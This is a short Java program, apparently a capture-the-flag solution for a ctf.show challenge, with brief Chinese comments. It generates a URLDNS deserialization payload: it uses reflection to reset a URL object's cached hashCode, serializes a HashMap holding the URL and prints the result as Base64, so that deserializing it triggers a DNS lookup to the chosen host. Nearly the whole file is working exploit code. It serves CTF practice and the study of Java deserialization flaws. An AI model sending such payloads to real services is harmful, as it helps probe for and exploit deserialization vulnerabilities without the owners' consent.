package playloads;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;

public class URLDINS {
//    Gadget Chain:
//            HashMap.readObject()
//            HashMap.putVal()
//            HashMap.hash()
//            URL.hashCode()

    public static void main(String[] args) throws Exception {
        HashMap<URL, Object> hashmap = new HashMap<>();
        URL url = new URL("https://fad346cf-639b-4a40-ba45-1052296ab5e6.challenge.ctf.show");
        url.hashCode();
        Field filed = Class.forName("java.net.URL").getDeclaredField("hashCode");
        filed.setAccessible(true);  // 绕过Java语言权限控制检查的权限
        filed.set(url, 123); // 这里不要发起请求，把urL对象的hashcode改成不是-1的值
        hashmap.put(url, 1);
        filed.set(url, -1);

        ByteArrayOutputStream b = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(b);
        oos.writeObject(hashmap);

        String payload = Base64.getEncoder().encodeToString(b.toByteArray());
        System.out.println(payload);
    }


}
